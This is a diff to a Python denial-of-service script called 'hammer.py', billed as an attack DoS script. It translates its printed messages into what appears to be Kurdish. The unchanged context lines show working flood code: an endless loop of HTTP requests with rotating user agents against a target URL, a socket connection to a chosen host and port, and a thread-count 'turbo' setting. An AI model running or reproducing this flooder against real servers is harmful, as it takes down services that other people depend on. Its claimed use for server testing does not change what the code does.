@@ -35,7 +35,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is hammering...\033[0m")
+			print("\033[94mbot dast ba shkandn dakat\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -77,7 +77,7 @@ def dos2():
 def usage():
 	print (''' \033[92mprint	shaetan attack Dos Script v.1 http://www.canyalcin.com/
 	TAWANE HICH HALAYAK HAL NAGRIN 
-	BAKAR BO TESTE SERVARE IP U BO HERSH SAR SAIT\n
+	BAKAR BO TESTE SERVAR ba IP U BO HERSH SAR SAIT\n
 	usage : python3 hammer.py [-s] [-p] [-t]
 	-h : bo yarmati
 	-s : server ip
@@ -136,7 +136,7 @@ if __name__ == '__main__':
 		usage()
 	get_parameters()
 	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94mPlease wait...\033[0m")
+	print("\033[94mKamek bosta...\033[0m")
 	user_agent()
 	my_bots()
 	time.sleep(5)
@@ -145,7 +145,7 @@ if __name__ == '__main__':
 		s.connect((host,int(port)))
 		s.settimeout(1)
 	except socket.error as e:
-		print("\033[91mcheck server ip and port\033[0m")
+		print("\033[91mIp servaru portakat chaka\033[0m")
 		usage()
 	while True:
 		for i in range(int(thr)):
